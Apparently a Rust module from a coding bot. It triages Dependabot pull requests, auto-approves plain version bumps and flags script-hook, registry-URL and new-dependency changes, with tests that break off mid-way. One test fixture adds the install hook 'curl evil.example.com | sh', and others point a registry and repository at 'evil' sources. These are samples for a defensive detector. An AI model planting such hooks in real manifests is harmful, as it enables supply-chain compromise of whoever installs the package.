//! Dependency-update triage audit. Lists Dependabot PRs on the bot's
//! fork (or upstream when `github.fork_owner` is unset), classifies each
//! diff against a strict "safe shape" filter (version-string bumps only,
//! no script hooks, no URL changes), approves the safe ones via the
//! GitHub Reviews API, and reports unsafe ones via chatops findings.
//!
//! `requires_head_change = false` (registries update independently of
//! HEAD); `WritePolicy::None` (the audit only interacts with GitHub via
//! API and never touches the workspace tree).

use anyhow::Result;
use async_trait::async_trait;
use std::collections::{HashMap, HashSet};

use super::{Audit, AuditContext, AuditOutcome, Finding, Severity, WritePolicy};
use crate::config::{AuditSettings, GithubConfig};
use crate::github::{self, DEFAULT_API_BASE};
use crate::github_credentials;

/// Default per-run approval cap. Operators override via
/// `audits.settings.dependency_update_triage.extra.max_approvals_per_run`.
pub const DEFAULT_MAX_APPROVALS_PER_RUN: u32 = 5;
/// Hard upper bound on the number of PRs inspected per run. Defends
/// against a fork accumulating hundreds of Dependabot PRs from melting
/// down the audit with sequential diff fetches.
pub const PR_INSPECTION_CAP: usize = 100;
/// Default fork-remote name. Aligns with the existing fork-PR mode
/// convention; operators with a different remote naming override via
/// `audits.settings.dependency_update_triage.extra.fork_remote_name`.
pub const DEFAULT_FORK_REMOTE_NAME: &str = "fork";

const SETTINGS_KEY_MAX_APPROVALS: &str = "max_approvals_per_run";
const SETTINGS_KEY_FORK_REMOTE: &str = "fork_remote_name";

const DEPENDABOT_LOGINS: &[&str] = &["dependabot[bot]", "dependabot-preview[bot]"];

const APPROVE_REVIEW_BODY: &str =
    "autocoder: safe-shape filter passed (manifest-only version bumps)";

/// Manifest filenames the safe-shape filter recognizes. Anything outside
/// this list (or the `*.csproj` extension) trips
/// [`Classification::NonManifestFiles`].
pub const KNOWN_MANIFEST_FILES: &[&str] = &[
    "Cargo.toml",
    "Cargo.lock",
    "package.json",
    "package-lock.json",
    "yarn.lock",
    "requirements.txt",
    "pyproject.toml",
    "packages.lock.json",
    "go.mod",
    "go.sum",
    "Gemfile",
    "Gemfile.lock",
    "composer.json",
    "composer.lock",
    "pom.xml",
    "build.gradle",
    "build.gradle.kts",
];

/// Outcome of running the safe-shape filter against one PR's unified
/// diff. `Safe` permits an approval; every other variant blocks approval
/// and triggers a chatops finding (severity per the spec scenarios).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Classification {
    /// Every modified file is a known manifest and every change is a
    /// version-string update with no new entries / scripts / URL changes.
    Safe,
    /// A new top-level dependency entry was added in the named manifest.
    /// `entry` is the offending key string (e.g. `"newdep"`).
    NewDependencyEntry { path: String, entry: String },
    /// An install / lifecycle script hook field was added or modified in
    /// the named manifest (e.g. `scripts.postinstall` in package.json,
    /// `build = "..."` in Cargo.toml). High severity.
    ScriptHookAdded { path: String, hook: String },
    /// A source URL / registry field changed for an existing dependency
    /// (e.g. `repository`, `registry`, `homepage`). High severity.
    SourceUrlChange { path: String, field: String },
    /// One or more files in the diff are not in the known-manifest list.
    /// Low severity (most often a docs or workflow-file edit).
    NonManifestFiles { paths: Vec<String> },
    /// The unified diff could not be parsed. Treated as "skip + report"
    /// so the operator notices.
    DiffParseError(String),
}

/// The audit struct. Built once at startup; the `GithubConfig` is
/// snapshotted at construction time (operators reloading config to
/// change `fork_owner` mid-flight will not retroactively retarget this
/// audit until the daemon restarts — same as every other audit in the
/// registry).
pub struct DependencyUpdateAudit {
    pub max_approvals_per_run: u32,
    pub fork_remote_name: String,
    github_cfg: GithubConfig,
    /// API base URL. Defaults to the real GitHub API; tests override via
    /// [`Self::with_api_base`] to point at a mockito server.
    api_base: String,
}

impl DependencyUpdateAudit {
    pub const TYPE: &'static str = "dependency_update_triage";

    /// Build the audit from the audit settings map and a cloned GitHub
    /// config. Knobs read out of `extra`:
    /// - `max_approvals_per_run` (u32, default `5`)
    /// - `fork_remote_name` (string, default `"fork"`)
    pub fn new(audit_settings: &HashMap<String, AuditSettings>, github_cfg: GithubConfig) -> Self {
        let entry = audit_settings.get(Self::TYPE);
        let max_approvals_per_run = entry
            .and_then(|s| s.extra.get(SETTINGS_KEY_MAX_APPROVALS))
            .and_then(|v| v.as_u64())
            .map(|n| n as u32)
            .unwrap_or(DEFAULT_MAX_APPROVALS_PER_RUN);
        let fork_remote_name = entry
            .and_then(|s| s.extra.get(SETTINGS_KEY_FORK_REMOTE))
            .and_then(|v| v.as_str())
            .map(|s| s.to_string())
            .unwrap_or_else(|| DEFAULT_FORK_REMOTE_NAME.to_string());
        Self {
            max_approvals_per_run,
            fork_remote_name,
            github_cfg,
            api_base: DEFAULT_API_BASE.to_string(),
        }
    }

    /// Test-only: redirect this audit's GitHub API calls to `api_base`
    /// (a mockito server URL). Production code never touches this.
    #[cfg(test)]
    pub fn with_api_base(mut self, api_base: impl Into<String>) -> Self {
        self.api_base = api_base.into();
        self
    }
}

#[async_trait]
impl Audit for DependencyUpdateAudit {
    fn audit_type(&self) -> &'static str {
        Self::TYPE
    }

    fn requires_head_change(&self) -> bool {
        false
    }

    fn write_policy(&self) -> WritePolicy {
        WritePolicy::None
    }

    async fn run(&self, ctx: &mut AuditContext<'_>) -> Result<AuditOutcome> {
        let (upstream_owner, repo_name) = github::parse_repo_url(&ctx.repo.url)?;
        let target_owner = self
            .github_cfg
            .fork_owner
            .clone()
            .unwrap_or_else(|| upstream_owner.clone());
        // Token route is keyed by the owner of the *target* repo so
        // operators using `owner_tokens` can supply distinct PATs for
        // the fork and upstream.
        let token = github_credentials::resolve_token(&self.github_cfg, &target_owner)?;

        let _ = ctx.log_writer.write_section(
            "dependency_update_target",
            &format!(
                "target_owner: {target_owner}\nrepo: {repo_name}\nmax_approvals_per_run: {}\nfork_remote_name: {}",
                self.max_approvals_per_run, self.fork_remote_name,
            ),
        );

        let prs = github::list_open_prs_by_author_at(
            &self.api_base,
            &target_owner,
            &repo_name,
            DEPENDABOT_LOGINS,
            &token,
        )
        .await?;

        let mut findings: Vec<Finding> = Vec::new();
        let mut approvals_used: u32 = 0;
        let mut deferred_numbers: Vec<u64> = Vec::new();

        for (i, pr) in prs.iter().enumerate() {
            if i >= PR_INSPECTION_CAP {
                tracing::warn!(
                    pr_count = prs.len(),
                    cap = PR_INSPECTION_CAP,
                    "dependency_update_triage: PR list exceeded inspection cap; remaining PRs deferred to next run"
                );
                break;
            }

            // Skip PRs that already carry an APPROVED review. Without a
            // cheap "who am I" lookup we treat ANY APPROVED review as
            // "already triaged" — this matches the spec's intent of not
            // re-approving and errs on the side of caution.
            match github::list_pr_reviews_at(
                &self.api_base,
                &target_owner,
                &repo_name,
                pr.number,
                &token,
            )
            .await
            {
                Ok(reviews) => {
                    let approver = reviews
                        .iter()
                        .find(|r| r.state.eq_ignore_ascii_case("APPROVED"));
                    if let Some(r) = approver {
                        let _ = ctx.log_writer.write_section(
                            &format!("pr_{}_skip_already_approved", pr.number),
                            &format!(
                                "pr: {}\nauthor: {}\nexisting_approver: {}\n",
                                pr.html_url, pr.author_login, r.user_login
                            ),
                        );
                        continue;
                    }
                }
                Err(e) => {
                    tracing::warn!(
                        pr_number = pr.number,
                        "dependency_update_triage: list_pr_reviews failed; treating as not approved and continuing: {e:#}"
                    );
                }
            }

            let diff = match github::fetch_pr_diff_at(
                &self.api_base,
                &target_owner,
                &repo_name,
                pr.number,
                &token,
            )
            .await
            {
                Ok(d) => d,
                Err(e) => {
                    tracing::warn!(
                        pr_number = pr.number,
                        "dependency_update_triage: diff fetch failed; skipping: {e:#}"
                    );
                    findings.push(Finding {
                        severity: Severity::Low,
                        subject: format!("PR #{} diff fetch failed, skipping", pr.number),
                        body: format!("pr_url: {}\nerror: {e:#}", pr.html_url),
                        anchor: Some(pr.html_url.clone()),
                    });
                    continue;
                }
            };

            let classification = classify_diff(&diff);
            let _ = ctx.log_writer.write_section(
                &format!("pr_{}_classification", pr.number),
                &format!(
                    "pr: {}\ntitle: {}\nclassification: {classification:?}",
                    pr.html_url, pr.title
                ),
            );

            match classification {
                Classification::Safe => {
                    if approvals_used >= self.max_approvals_per_run {
                        deferred_numbers.push(pr.number);
                        continue;
                    }
                    match github::approve_pr_at(
                        &self.api_base,
                        &target_owner,
                        &repo_name,
                        pr.number,
                        APPROVE_REVIEW_BODY,
                        &token,
                    )
                    .await
                    {
                        Ok(()) => {
                            approvals_used += 1;
                            tracing::info!(
                                pr_number = pr.number,
                                pr_url = %pr.html_url,
                                "dependency_update_triage: approved safe PR"
                            );
                        }
                        Err(e) => {
                            findings.push(Finding {
                                severity: Severity::Medium,
                                subject: format!(
                                    "PR #{} approve API failed",
                                    pr.number
                                ),
                                body: format!("pr_url: {}\nerror: {e:#}", pr.html_url),
                                anchor: Some(pr.html_url.clone()),
                            });
                        }
                    }
                }
                Classification::NewDependencyEntry { path, entry } => {
                    findings.push(Finding {
                        severity: Severity::Medium,
                        subject: format!(
                            "PR #{} adds new dependency entry — manual review required",
                            pr.number
                        ),
                        body: format!(
                            "pr_url: {}\ntitle: {}\nmanifest: {}\nnew_entry: {}",
                            pr.html_url, pr.title, path, entry
                        ),
                        anchor: Some(pr.html_url.clone()),
                    });
                }
                Classification::ScriptHookAdded { path, hook } => {
                    findings.push(Finding {
                        severity: Severity::High,
                        subject: format!(
                            "PR #{} modifies install scripts — manual review required",
                            pr.number
                        ),
                        body: format!(
                            "pr_url: {}\ntitle: {}\nmanifest: {}\nhook: {}",
                            pr.html_url, pr.title, path, hook
                        ),
                        anchor: Some(pr.html_url.clone()),
                    });
                }
                Classification::SourceUrlChange { path, field } => {
                    findings.push(Finding {
                        severity: Severity::High,
                        subject: format!(
                            "PR #{} changes dependency source URL — manual review required",
                            pr.number
                        ),
                        body: format!(
                            "pr_url: {}\ntitle: {}\nmanifest: {}\nfield: {}",
                            pr.html_url, pr.title, path, field
                        ),
                        anchor: Some(pr.html_url.clone()),
                    });
                }
                Classification::NonManifestFiles { paths } => {
                    findings.push(Finding {
                        severity: Severity::Low,
                        subject: format!(
                            "PR #{} modifies non-manifest files — manual review required",
                            pr.number
                        ),
                        body: format!(
                            "pr_url: {}\ntitle: {}\nunexpected_paths:\n{}",
                            pr.html_url,
                            pr.title,
                            paths.join("\n")
                        ),
                        anchor: Some(pr.html_url.clone()),
                    });
                }
                Classification::DiffParseError(reason) => {
                    findings.push(Finding {
                        severity: Severity::Low,
                        subject: format!(
                            "PR #{} diff parse failed, skipping",
                            pr.number
                        ),
                        body: format!(
                            "pr_url: {}\ntitle: {}\nreason: {reason}",
                            pr.html_url, pr.title
                        ),
                        anchor: Some(pr.html_url.clone()),
                    });
                }
            }
        }

        if !deferred_numbers.is_empty() {
            let list = deferred_numbers
                .iter()
                .map(|n| format!("#{n}"))
                .collect::<Vec<_>>()
                .join(", ");
            findings.push(Finding {
                severity: Severity::Low,
                subject: format!(
                    "dependency_update_triage: {} safe PR(s) deferred (per-run cap = {})",
                    deferred_numbers.len(),
                    self.max_approvals_per_run
                ),
                body: format!("deferred: {list}"),
                anchor: None,
            });
        }

        let _ = ctx.log_writer.write_section(
            "dependency_update_summary",
            &format!(
                "prs_inspected: {}\napprovals_used: {}\ndeferred_safe: {}\nfindings_count: {}",
                prs.len().min(PR_INSPECTION_CAP),
                approvals_used,
                deferred_numbers.len(),
                findings.len()
            ),
        );

        Ok(AuditOutcome::Reported(findings))
    }
}

/// Classify a unified diff against the safe-shape filter. The order of
/// checks is: non-manifest files first (fast reject), then per-file
/// script-hook → URL change → new-entry detection. The first violating
/// classification wins; remaining issues stay in the diff but the
/// returned variant carries enough information to render a finding.
pub fn classify_diff(diff: &str) -> Classification {
    let files = match parse_diff(diff) {
        Ok(f) => f,
        Err(e) => return Classification::DiffParseError(e),
    };
    if files.is_empty() {
        return Classification::DiffParseError("no file sections found in diff".into());
    }

    // First sweep: any non-manifest paths.
    let mut non_manifest: Vec<String> = Vec::new();
    for f in &files {
        let bn = basename(&f.path);
        if !is_known_manifest(bn) {
            non_manifest.push(f.path.clone());
        }
    }
    if !non_manifest.is_empty() {
        return Classification::NonManifestFiles { paths: non_manifest };
    }

    // Second sweep: script hook (highest severity → check first), URL
    // change, then new-entry. We deterministically take the FIRST hit
    // in iteration order to keep test expectations stable.
    let mut script_hit: Option<(String, String)> = None;
    let mut url_hit: Option<(String, String)> = None;
    let mut newdep_hit: Option<(String, String)> = None;

    for f in &files {
        let bn = basename(&f.path);
        for line in &f.added_lines {
            if script_hit.is_none() {
                if let Some(hook) = script_hook_field(bn, line) {
                    script_hit = Some((f.path.clone(), hook.to_string()));
                }
            }
            if url_hit.is_none() && !is_lockfile(bn) {
                if let Some(field) = url_field(bn, line) {
                    url_hit = Some((f.path.clone(), field.to_string()));
                }
            }
        }
        // New-dependency detection: skip for lockfiles (transitive bumps
        // legitimately add entries) and for files with no added lines.
        if newdep_hit.is_none() && !is_lockfile(bn) {
            if let Some(entry) = new_entry(bn, &f.added_lines, &f.removed_lines) {
                newdep_hit = Some((f.path.clone(), entry));
            }
        }
    }

    if let Some((path, hook)) = script_hit {
        return Classification::ScriptHookAdded { path, hook };
    }
    if let Some((path, field)) = url_hit {
        return Classification::SourceUrlChange { path, field };
    }
    if let Some((path, entry)) = newdep_hit {
        return Classification::NewDependencyEntry { path, entry };
    }
    Classification::Safe
}

struct FileDiff {
    path: String,
    added_lines: Vec<String>,
    removed_lines: Vec<String>,
}

fn parse_diff(diff: &str) -> std::result::Result<Vec<FileDiff>, String> {
    let mut out: Vec<FileDiff> = Vec::new();
    let mut current: Option<FileDiff> = None;
    for line in diff.lines() {
        if let Some(rest) = line.strip_prefix("diff --git ") {
            if let Some(f) = current.take() {
                out.push(f);
            }
            current = Some(FileDiff {
                path: parse_diff_git_path(rest),
                added_lines: Vec::new(),
                removed_lines: Vec::new(),
            });
            continue;
        }
        let Some(file) = current.as_mut() else {
            continue;
        };
        if let Some(p) = line.strip_prefix("+++ ") {
            if let Some(stripped) = p.strip_prefix("b/") {
                file.path = stripped.to_string();
            }
            continue;
        }
        if line.starts_with("--- ")
            || line.starts_with("@@")
            || line.starts_with("index ")
            || line.starts_with("new file mode")
            || line.starts_with("deleted file mode")
            || line.starts_with("similarity ")
            || line.starts_with("rename ")
            || line.starts_with("Binary ")
            || line.starts_with("\\ No newline")
        {
            continue;
        }
        if let Some(content) = line.strip_prefix('+') {
            file.added_lines.push(content.to_string());
        } else if let Some(content) = line.strip_prefix('-') {
            file.removed_lines.push(content.to_string());
        }
        // Context lines (starting with ' ') and blank lines are ignored.
    }
    if let Some(f) = current.take() {
        out.push(f);
    }
    Ok(out)
}

fn parse_diff_git_path(s: &str) -> String {
    // s is `a/<path> b/<path>` (paths may contain spaces; in practice
    // Dependabot doesn't generate such paths, so use a simple split).
    if let Some(idx) = s.find(" b/") {
        return s[idx + 3..].to_string();
    }
    s.to_string()
}

fn basename(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

fn is_known_manifest(basename: &str) -> bool {
    KNOWN_MANIFEST_FILES.contains(&basename) || basename.ends_with(".csproj")
}

fn is_lockfile(basename: &str) -> bool {
    basename.ends_with(".lock")
        || basename == "package-lock.json"
        || basename == "packages.lock.json"
        || basename == "go.sum"
        || basename == "yarn.lock"
}

/// Detect a script / install-hook key added by `line`. Returns the hook
/// name (e.g. `"postinstall"`, `"build"`) when matched, `None` otherwise.
fn script_hook_field(basename: &str, line: &str) -> Option<&'static str> {
    let trimmed = line.trim_start();
    // JSON-style manifests (package.json, composer.json, etc.)
    if basename.ends_with(".json") {
        for hook in &["postinstall", "preinstall", "prepublish", "prepare"] {
            let needle = format!("\"{hook}\"");
            if line_starts_key(trimmed, &needle) {
                return Some(map_hook_name(hook));
            }
        }
    }
    // Cargo.toml: `build = "build.rs"` declares a build-script override.
    if basename == "Cargo.toml" {
        if trimmed.starts_with("build = ") || trimmed.starts_with("build=") {
            return Some("build");
        }
    }
    // pyproject.toml: rough check for a `prepare` script-style field.
    if basename == "pyproject.toml"
        && (trimmed.starts_with("prepare = ") || trimmed.starts_with("prepare="))
    {
        return Some("prepare");
    }
    None
}

fn map_hook_name(s: &str) -> &'static str {
    match s {
        "postinstall" => "postinstall",
        "preinstall" => "preinstall",
        "prepublish" => "prepublish",
        "prepare" => "prepare",
        _ => "<unknown>",
    }
}

/// Detect a URL/registry field for an existing dependency in `line`.
/// Returns the field name when matched. Lockfiles are NOT inspected for
/// this — `resolved`, `integrity` etc. change on every version bump.
fn url_field(basename: &str, line: &str) -> Option<&'static str> {
    let trimmed = line.trim_start();
    if basename.ends_with(".json") {
        for field in &["registry", "repository", "homepage", "download-url"] {
            let needle = format!("\"{field}\"");
            if line_starts_key(trimmed, &needle) {
                return Some(map_url_field(field));
            }
        }
    }
    if basename == "Cargo.toml" || basename == "pyproject.toml" {
        for field in &["registry", "repository", "homepage"] {
            if trimmed.starts_with(&format!("{field} =")) || trimmed.starts_with(&format!("{field}=")) {
                return Some(map_url_field(field));
            }
        }
    }
    None
}

fn map_url_field(s: &str) -> &'static str {
    match s {
        "registry" => "registry",
        "repository" => "repository",
        "homepage" => "homepage",
        "download-url" => "download-url",
        _ => "<unknown>",
    }
}

/// Does `trimmed` start with `key` followed (after optional spaces) by a
/// `:`? Used to verify the matched substring is actually a JSON key,
/// not the contents of a string value.
fn line_starts_key(trimmed: &str, key: &str) -> bool {
    let Some(rest) = trimmed.strip_prefix(key) else {
        return false;
    };
    let after = rest.trim_start();
    after.starts_with(':')
}

/// Detect a top-level dependency-style entry that was added but not
/// removed. Returns the offending key when matched.
fn new_entry(basename: &str, added: &[String], removed: &[String]) -> Option<String> {
    let extractor: fn(&str) -> Option<String> = if basename.ends_with(".json") {
        extract_json_key
    } else if basename == "Cargo.toml"
        || basename == "pyproject.toml"
        || basename == "go.mod"
        || basename.ends_with(".csproj")
        || basename == "Gemfile"
    {
        extract_toml_or_ruby_key
    } else if basename == "requirements.txt" {
        extract_requirements_name
    } else {
        // Conservative fallback: skip new-entry detection for unknown
        // manifests (we still detect script/URL changes there).
        return None;
    };

    let added_keys: HashSet<String> = added.iter().filter_map(|l| extractor(l)).collect();
    let removed_keys: HashSet<String> = removed.iter().filter_map(|l| extractor(l)).collect();
    let new_keys: Vec<&String> = added_keys.difference(&removed_keys).collect();
    if new_keys.is_empty() {
        return None;
    }
    // Pick the deterministically-first key (sorted) so test expectations
    // stay stable across HashSet iteration orders.
    let mut sorted: Vec<&String> = new_keys.into_iter().collect();
    sorted.sort();
    Some(sorted.first().map(|s| s.to_string()).unwrap_or_default())
}

fn extract_json_key(line: &str) -> Option<String> {
    let trimmed = line.trim_start();
    let after_quote = trimmed.strip_prefix('"')?;
    let end = after_quote.find('"')?;
    let key = &after_quote[..end];
    if key.is_empty() {
        return None;
    }
    let after = after_quote[end + 1..].trim_start();
    if !after.starts_with(':') {
        return None;
    }
    Some(key.to_string())
}

fn extract_toml_or_ruby_key(line: &str) -> Option<String> {
    let trimmed = line.trim_start();
    if trimmed.starts_with('[') || trimmed.starts_with('#') {
        return None;
    }
    let eq_idx = trimmed.find('=')?;
    let key = trimmed[..eq_idx].trim();
    if key.is_empty() {
        return None;
    }
    if !key
        .chars()
        .all(|c| c.is_alphanumeric() || c == '_' || c == '-' || c == '.')
    {
        return None;
    }
    Some(key.to_string())
}

fn extract_requirements_name(line: &str) -> Option<String> {
    let trimmed = line.trim();
    if trimmed.is_empty() || trimmed.starts_with('#') {
        return None;
    }
    // requirements.txt entries look like `name==1.0` / `name>=1.0` /
    // `name[extra]==1.0` / `name @ url`. Take the leading identifier.
    let mut end = trimmed.len();
    for (idx, ch) in trimmed.char_indices() {
        if !(ch.is_alphanumeric() || ch == '_' || ch == '-' || ch == '.') {
            end = idx;
            break;
        }
    }
    let name = &trimmed[..end];
    if name.is_empty() {
        None
    } else {
        Some(name.to_string())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn safe_classification_for_version_bump_only_diff() {
        let diff = r#"diff --git a/Cargo.toml b/Cargo.toml
--- a/Cargo.toml
+++ b/Cargo.toml
@@ -1,5 +1,5 @@
 [dependencies]
-serde = "1.0.0"
+serde = "1.0.1"
 anyhow = "1.0.0"
"#;
        assert_eq!(classify_diff(diff), Classification::Safe);
    }

    #[test]
    fn new_dependency_entry_in_package_json_rejected() {
        let diff = r#"diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -1,8 +1,9 @@
 {
   "dependencies": {
     "express": "4.0.0",
-    "lodash": "4.17.0"
+    "lodash": "4.17.21",
+    "evil-newdep": "1.0.0"
   }
 }
"#;
        match classify_diff(diff) {
            Classification::NewDependencyEntry { path, entry } => {
                assert_eq!(path, "package.json");
                assert_eq!(entry, "evil-newdep");
            }
            other => panic!("expected NewDependencyEntry, got {other:?}"),
        }
    }

    #[test]
    fn new_postinstall_script_in_package_json_rejected() {
        let diff = r#"diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -1,5 +1,6 @@
 {
   "scripts": {
+    "postinstall": "curl evil.example.com | sh",
     "test": "jest"
   }
 }
"#;
        match classify_diff(diff) {
            Classification::ScriptHookAdded { path, hook } => {
                assert_eq!(path, "package.json");
                assert_eq!(hook, "postinstall");
            }
            other => panic!("expected ScriptHookAdded, got {other:?}"),
        }
    }

    #[test]
    fn new_build_field_in_cargo_toml_rejected() {
        let diff = r#"diff --git a/Cargo.toml b/Cargo.toml
--- a/Cargo.toml
+++ b/Cargo.toml
@@ -1,3 +1,4 @@
 [package]
 name = "foo"
+build = "build.rs"
"#;
        match classify_diff(diff) {
            Classification::ScriptHookAdded { path, hook } => {
                assert_eq!(path, "Cargo.toml");
                assert_eq!(hook, "build");
            }
            other => panic!("expected ScriptHookAdded(build), got {other:?}"),
        }
    }

    #[test]
    fn non_manifest_file_in_diff_rejected() {
        let diff = r#"diff --git a/Cargo.toml b/Cargo.toml
--- a/Cargo.toml
+++ b/Cargo.toml
@@ -1,1 +1,1 @@
-serde = "1.0.0"
+serde = "1.0.1"
diff --git a/src/main.rs b/src/main.rs
--- a/src/main.rs
+++ b/src/main.rs
@@ -1,1 +1,1 @@
-fn main() {}
+fn main() { println!("hi"); }
"#;
        match classify_diff(diff) {
            Classification::NonManifestFiles { paths } => {
                assert!(paths.iter().any(|p| p == "src/main.rs"), "got: {paths:?}");
            }
            other => panic!("expected NonManifestFiles, got {other:?}"),
        }
    }

    #[test]
    fn lockfile_only_version_hash_changes_allowed() {
        let diff = r#"diff --git a/Cargo.lock b/Cargo.lock
--- a/Cargo.lock
+++ b/Cargo.lock
@@ -10,8 +10,8 @@
 [[package]]
 name = "serde"
-version = "1.0.0"
+version = "1.0.1"
 source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "aaa"
+checksum = "bbb"
"#;
        assert_eq!(classify_diff(diff), Classification::Safe);
    }

    #[test]
    fn registry_url_change_rejected() {
        let diff = r#"diff --git a/Cargo.toml b/Cargo.toml
--- a/Cargo.toml
+++ b/Cargo.toml
@@ -1,5 +1,5 @@
 [package]
 name = "foo"
-registry = "crates-io"
+registry = "evil-corp"
"#;
        match classify_diff(diff) {
            Classification::SourceUrlChange { path, field } => {
                assert_eq!(path, "Cargo.toml");
                assert_eq!(field, "registry");
            }
            other => panic!("expected SourceUrlChange(registry), got {other:?}"),
        }
    }

    #[test]
    fn package_json_repository_change_rejected() {
        let diff = r#"diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -1,5 +1,5 @@
 {
   "name": "foo",
-  "repository": "github:original/repo",
+  "repository": "github:evil/repo",
   "version": "1.0.0"
 }
"#;
        match classify_diff(diff) {
            Classification::SourceUrlChange { path, field } => {
                assert_eq!(path, "package.json");
                assert_eq!(field, "repository");
            }
            other => panic!("expected SourceUrlChange(repository), got {other:?}"),
        }
    }

    #[test]
    fn empty_diff_classified_as_parse_error() {
        let c = classify_diff("");
        assert!(matches!(c, Classification::DiffParseError(_)));
    }

    #[test]
    fn known_manifest_filter_accepts_csproj() {
        assert!(is_known_manifest("MyApp.csproj"));
        assert!(!is_known_manifest("src.cs"));
    }

    #[test]
    fn dependency_update_audit_reads_extra_knobs() {
        let mut extra = HashMap::new();
        extra.insert(
            SETTINGS_KEY_MAX_APPROVALS.to_string(),
            serde_yaml::Value::Number(serde_yaml::Number::from(11_u64)),
        );
        extra.insert(
            SETTINGS_KEY_FORK_REMOTE.to_string(),
            serde_yaml::Value::String("upstream-fork".to_string()),
        );
        let mut map = HashMap::new();
        map.insert(
            DependencyUpdateAudit::TYPE.to_string(),
            AuditSettings {
                prompt_path: None,
                notify_on_clean: false,
                extra,
            },
        );
        let audit = DependencyUpdateAudit::new(&map, fake_github_cfg());
        assert_eq!(audit.max_approvals_per_run, 11);
        assert_eq!(audit.fork_remote_name, "upstream-fork");
    }

    #[test]
    fn dependency_update_audit_defaults_when_no_settings() {
        let audit = DependencyUpdateAudit::new(&HashMap::new(), fake_github_cfg());
        assert_eq!(audit.max_approvals_per_run, DEFAULT_MAX_APPROVALS_PER_RUN);
        assert_eq!(audit.fork_remote_name, DEFAULT_FORK_REMOTE_NAME);
    }

    fn fake_github_cfg() -> GithubConfig {
        GithubConfig {
            token_env: "X".into(),
            token: None,
            owner_tokens: None,
            fork_owner: None,
            recreate_fork_on_reinit: false,
        }
    }
}

#[cfg(test)]
mod audit_tests {
    //! Integration-style tests for `DependencyUpdateAudit::run` against a
    //! mockito server. Each test sets up the full chain of GitHub API
    //! expectations (list PRs → list reviews → fetch diff → approve) and
    //! asserts the resulting `AuditOutcome` findings + approval mocks.
    use super::*;
    use crate::audits::{Audit, AuditContext, AuditLogWriter, AuditOutcome};
    use crate::config::{GithubConfig, RepositoryConfig, SecretSource};
    use std::collections::HashMap;
    use std::sync::Mutex;
    use tempfile::TempDir;

    /// Mockito env vars are process-global, so we serialize tests that
    /// poke at env vars. (The token is set via inline `SecretSource` in
    /// every test below, so this is currently belt-and-braces.)
    static ENV_LOCK: Mutex<()> = Mutex::new(());

    fn fixture_repo() -> RepositoryConfig {
        RepositoryConfig {
            url: "git@github.com:upstream-org/repo.git".into(),
            local_path: None,
            base_branch: "main".into(),
            agent_branch: "agent-q".into(),
            poll_interval_sec: 60,
            chatops_channel_id: None,
            max_changes_per_pr: None,
            audits: None,
        }
    }

    fn github_cfg_with_fork(fork: Option<&str>) -> GithubConfig {
        GithubConfig {
            token_env: "UNUSED_VAR".into(),
            token: Some(SecretSource::Inline {
                value: "ttt".into(),
            }),
            owner_tokens: None,
            fork_owner: fork.map(|s| s.to_string()),
            recreate_fork_on_reinit: false,
        }
    }

    fn audit_for(api_base: &str, fork: Option<&str>, cap: u32) -> DependencyUpdateAudit {
        let mut audit = DependencyUpdateAudit::new(&HashMap::new(), github_cfg_with_fork(fork));
        audit.max_approvals_per_run = cap;
        audit.with_api_base(api_base)
    }

    fn make_ctx<'a>(
        workspace: &'a std::path::Path,
        repo: &'a RepositoryConfig,
    ) -> AuditContext<'a> {
        let log_writer = AuditLogWriter::open(workspace, "dependency_update_triage")
            .expect("audit log open succeeds");
        AuditContext {
            workspace,
            repo,
            chatops_ctx: None,
            log_writer,
        }
    }

    /// Tiny safe diff used by every approve test. Single Cargo.toml
    /// version bump → must classify as Safe.
    const SAFE_DIFF: &str = "diff --git a/Cargo.toml b/Cargo.toml\n--- a/Cargo.toml\n+++ b/Cargo.toml\n@@ -1,1 +1,1 @@\n-serde = \"1.0.0\"\n+serde = \"1.0.1\"\n";

    /// Diff with an unrelated source file → NonManifestFiles.
    const UNSAFE_DIFF_NON_MANIFEST: &str = "diff --git a/src/lib.rs b/src/lib.rs\n--- a/src/lib.rs\n+++ b/src/lib.rs\n@@ -1,1 +1,1 @@\n-x\n+y\n";

    #[tokio::test]
    async fn run_approves_safe_prs_up_to_cap() {
        let _g = ENV_LOCK.lock().unwrap();
        let mut server = mockito::Server::new_async().await;

        // Three Dependabot PRs, all safe.
        let list = server
            .mock("GET", "/repos/forky/repo/pulls?state=open&per_page=100")
            .with_status(200)
            .with_body(
                r#"[
                  {"number":1,"html_url":"u/1","title":"deps: bump a","user":{"login":"dependabot[bot]"}},
                  {"number":2,"html_url":"u/2","title":"deps: bump b","user":{"login":"dependabot[bot]"}},
                  {"number":3,"html_url":"u/3","title":"deps: bump c","user":{"login":"dependabot[bot]"}}
                ]"#,
            )
            .expect(1)
            .create_async()
            .await;
        for n in 1..=3 {
            server
                .mock(
                    "GET",
                    format!("/repos/forky/repo/pulls/{n}/reviews").as_str(),
                )
                .with_status(200)
                .with_body("[]")
                .create_async()
                .await;
            server
                .mock(
                    "GET",
                    format!("/repos/forky/repo/pulls/{n}").as_str(),
                )
                .with_status(200)
                .with_body(SAFE_DIFF)
                .create_async()
                .await;
        }
        // Only PRs 1 and 2 should be approved (cap = 2). PR 3 deferred.
        let approve_1 = server
            .mock("POST", "/repos/forky/repo/pulls/1/reviews")
            .match_body(mockito::Matcher::PartialJsonString(
                r#"{"event":"APPROVE"}"#.to_string(),
            ))
            .with_status(200)
            .with_body("{}")
            .expect(1)
            .create_async()
            .await;
        let approve_2 = server
            .mock("POST", "/repos/forky/repo/pulls/2/reviews")
            .match_body(mockito::Matcher::PartialJsonString(
                r#"{"event":"APPROVE"}"#.to_string(),
            ))
            .with_status(200)
            .with_body("{}")
            .expect(1)
            .create_async()
            .await;
        // PR 3 must NOT have an approve POST.
        let approve_3_silent = server
            .mock("POST", "/repos/forky/repo/pulls/3/reviews")
            .expect(0)
            .create_async()
            .await;

        let ws_dir = TempDir::new().unwrap();
        let workspace = ws_dir.path();
        let repo = fixture_repo();
        let audit = audit_for(&server.url(), Some("forky"), 2);
        let mut ctx = make_ctx(workspace, &repo);
        let outcome = audit.run(&mut ctx).await.expect("run succeeds");

        list.assert_async().await;
        approve_1.assert_async().await;
        approve_2.assert_async().await;
        approve_3_silent.assert_async().await;

